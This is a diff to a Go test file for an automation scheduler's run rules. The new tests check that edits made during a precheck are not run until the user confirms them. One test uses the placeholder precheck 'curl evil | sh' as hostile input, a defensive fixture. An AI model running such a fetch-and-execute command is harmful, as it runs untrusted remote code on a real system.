@@ -14,6 +14,7 @@ import (
 	"github.com/NovaSeele/Seelegent/internal/api"
 	"github.com/NovaSeele/Seelegent/internal/clock"
 	"github.com/NovaSeele/Seelegent/internal/gate"
+	"github.com/NovaSeele/Seelegent/internal/member"
 	"github.com/NovaSeele/Seelegent/internal/quota"
 	"github.com/NovaSeele/Seelegent/internal/store"
 	"github.com/NovaSeele/Seelegent/internal/task"
@@ -330,7 +331,8 @@ func TestRunRules(t *testing.T) {
 		t.Fatalf("running = %+v", got)
 	}
 	run, _ = f.s.RunNow(ctx, a.ID)
-	if run.Outcome != api.AutoSkippedOverlap || !strings.Contains(run.Detail, "still") {
+	if run.Outcome != api.AutoSkippedOverlap || !strings.Contains(run.Detail, "still") || run.Info == nil ||
+		run.Info.Reason != api.RunTaskRunning || run.Info.TaskID != "t1" {
 		t.Fatalf("overlap = %+v", run)
 	}
 	f.tasks.finish("t1")
@@ -338,7 +340,9 @@ func TestRunRules(t *testing.T) {
 	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.1}}},
 		AccountQuota{AccountID: "acc2", Windows: []quota.Window{{Window: "5h", Remaining: 0.15}}})
 	run, _ = f.s.RunNow(ctx, a.ID)
-	if run.Outcome != api.AutoSkippedQuota || !strings.Contains(run.Detail, "15%") {
+	if run.Outcome != api.AutoSkippedQuota || !strings.Contains(run.Detail, "15%") || run.Info == nil ||
+		run.Info.Remaining == nil || *run.Info.Remaining != 15 || run.Info.MinRemaining != 20 ||
+		run.Info.Backend != "agy" {
 		t.Fatalf("quota = %+v", run)
 	}
 	// A window past its reset counts as full.
@@ -369,7 +373,8 @@ func TestRunRules(t *testing.T) {
 	}
 	f.mu.Unlock()
 	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoPrecheckFailed ||
-		!strings.Contains(run.Detail, "exit code 128: fatal") {
+		!strings.Contains(run.Detail, "exit code 128: fatal") || *run.Info.ExitCode != 128 ||
+		!strings.HasPrefix(run.Info.Output, "fatal: ") {
 		t.Fatalf("precheck broken = %+v", run)
 	}
 	f.mu.Lock()
@@ -382,11 +387,18 @@ func TestRunRules(t *testing.T) {
 	f.pre = nil
 	f.mu.Unlock()
 	f.tasks.fail = errors.New("no usable account")
-	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Detail != "no usable account" {
+	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Detail != "no usable account" ||
+		run.Info.Message != "no usable account" {
 		t.Fatalf("error = %+v", run)
 	}
+	// A member that is gone has a reason the dashboard explains.
+	f.tasks.fail = &member.MissingError{ID: "ada"}
+	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Info.Reason != api.RunMemberMissing ||
+		run.Info.Member != "ada" {
+		t.Fatalf("member error = %+v", run)
+	}
 	runs := f.runs(t, a.ID)
-	if len(runs) != 7 || runs[0].Outcome != api.AutoError || runs[6].Outcome != api.AutoStarted {
+	if len(runs) != 8 || runs[0].Outcome != api.AutoError || runs[7].Outcome != api.AutoStarted {
 		t.Fatalf("history = %+v", runs)
 	}
 	if err := f.s.Delete(ctx, a.ID); err != nil {
@@ -394,6 +406,85 @@ func TestRunRules(t *testing.T) {
 	}
 	if _, err := f.s.Runs(ctx, a.ID, 0); !errors.Is(err, ErrNotFound) {
 		t.Fatalf("runs after delete: %v", err)
+	}
+}
+
+// TestEditDuringPrecheck is the review's A1: an edit while the precheck runs is not run before the user confirms it,
+// and a run of its own stops when the automation or the master switch is turned off meanwhile. Nothing is started;
+// the run says why.
+func TestEditDuringPrecheck(t *testing.T) {
+	f := newFixture(t)
+	ctx := t.Context()
+	a := f.create(t, api.AutomationInput{Precheck: "check"})
+	f.enable(t, a.ID)
+	during := func(do func()) {
+		f.mu.Lock()
+		f.pre = func(string) gate.ExecResult {
+			do()
+			code := 0
+			return gate.ExecResult{Exit: &code}
+		}
+		f.mu.Unlock()
+	}
+	edit := func(p api.AutomationPatch) func() {
+		return func() {
+			if _, err := f.s.Update(ctx, a.ID, p); err != nil {
+				t.Error(err)
+			}
+		}
+	}
+	skipped := func(run api.AutomationRun, reason string) {
+		t.Helper()
+		if run.Outcome != api.AutoSkippedChanged || run.Info == nil || run.Info.Reason != reason || run.TaskID != "" ||
+			!strings.Contains(run.Detail, "nothing was started") || f.tasks.count() != 0 {
+			t.Fatalf("run = %+v (info %+v), %d tasks", run, run.Info, f.tasks.count())
+		}
+	}
+
+	// Run now: the prompt changes during the precheck.
+	during(edit(api.AutomationPatch{Prompt: ptr("EVIL: unconfirmed")}))
+	run, err := f.s.RunNow(ctx, a.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	skipped(run, api.RunChanged)
+
+	// A scheduled run: the same, and the record keeps the automation off until it is confirmed.
+	f.enable(t, a.ID)
+	during(edit(api.AutomationPatch{Precheck: ptr("curl evil | sh")}))
+	f.clock.Advance(40 * time.Second)
+	f.tickAndWait(t)
+	runs := f.runs(t, a.ID)
+	skipped(runs[0], api.RunChanged)
+	if runs[0].Trigger != api.TriggerSchedule {
+		t.Fatalf("trigger = %s", runs[0].Trigger)
+	}
+
+	// Turned off, or the master switch off, during a scheduled run's precheck.
+	f.enable(t, a.ID)
+	during(edit(api.AutomationPatch{Enabled: ptr(false)}))
+	f.clock.Advance(24 * time.Hour)
+	f.tickAndWait(t)
+	skipped(f.runs(t, a.ID)[0], api.RunDisabled)
+
+	f.enable(t, a.ID)
+	during(func() {
+		f.mu.Lock()
+		f.master = false
+		f.mu.Unlock()
+	})
+	f.clock.Advance(24 * time.Hour)
+	f.tickAndWait(t)
+	skipped(f.runs(t, a.ID)[0], api.RunMasterOff)
+
+	// Run now ignores the master switch, and an edit that does not change what runs (a rename) does not stop it:
+	// the confirmed prompt runs.
+	during(edit(api.AutomationPatch{Name: ptr("Renamed")}))
+	confirmed, _ := f.s.Get(ctx, a.ID)
+	run, err = f.s.RunNow(ctx, a.ID)
+	if err != nil || run.Outcome != api.AutoStarted || f.tasks.count() != 1 ||
+		f.tasks.reqs[0].Prompt != confirmed.Prompt || !confirmed.Confirmed {
+		t.Fatalf("run now = %+v %v, %d tasks", run, err, f.tasks.count())
 	}
 }
 
@@ -430,7 +521,9 @@ func TestScheduleTicks(t *testing.T) {
 	f.tasks.finish("t2")
 	f.clock.Advance(24*time.Hour + 2*time.Hour)
 	f.tickAndWait(t)
-	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoSkippedLate || f.tasks.count() != 2 {
+	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoSkippedLate || f.tasks.count() != 2 ||
+		runs[0].Info.LateMinutes != 140 || runs[0].Info.GraceMinutes != 30 ||
+		runs[0].Detail != "missed by 2h20m0s (grace 30 min)" {
 		t.Fatalf("late run = %+v", runs[0])
 	}
 	// The master switch off: the schedule moves on, nothing runs or is recorded.
